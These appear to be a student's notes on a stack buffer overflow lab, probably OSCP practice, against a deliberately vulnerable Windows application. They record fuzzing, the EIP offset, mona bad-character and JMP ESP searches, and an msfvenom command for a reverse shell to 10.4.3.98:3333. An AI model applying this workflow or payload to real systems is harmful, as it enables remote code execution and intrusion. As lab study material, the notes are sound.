### EIP
❯ python3 fuzzer.py
Fuzzing crashed at 2100 bytes

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2500

!mona findmsp -distance 2500

Log data, item 19
 Address=0BADF00D
 Message=    EIP contains normal pattern : 0x6f43396e (offset 2026)


BBBB and empty payload verified the offset

### Bad chars
##### Round 1
!mona bytearray -b "\x00"

ESP 0196FA30
!mona compare -f C:\mona\oscp\bytearray.bin -a 0196FA30

00 a9 aa cd ce d4 d5

##### Round 2
!mona bytearray -b "\x00\xa9\xcd\xd4"

ESP 0197FA30

!mona compare -f C:\mona\oscp\bytearray.bin -a 0197FA30

\x00\xa9\xcd\xd4

### JMP ESP
!mona jmp -r esp -cpb "\x00\xa9\xcd\xd4"

Log data, item 11
 Address=625011AF
 Message=  0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)

0x625011af
\xaf\x11\x50\x62

### Payload
msfvenom -p windows/shell_reverse_tcp LHOST=10.4.3.98 LPORT=3333 EXITFUNC=thread -b "\x00\xa9\xcd\xd4" -f c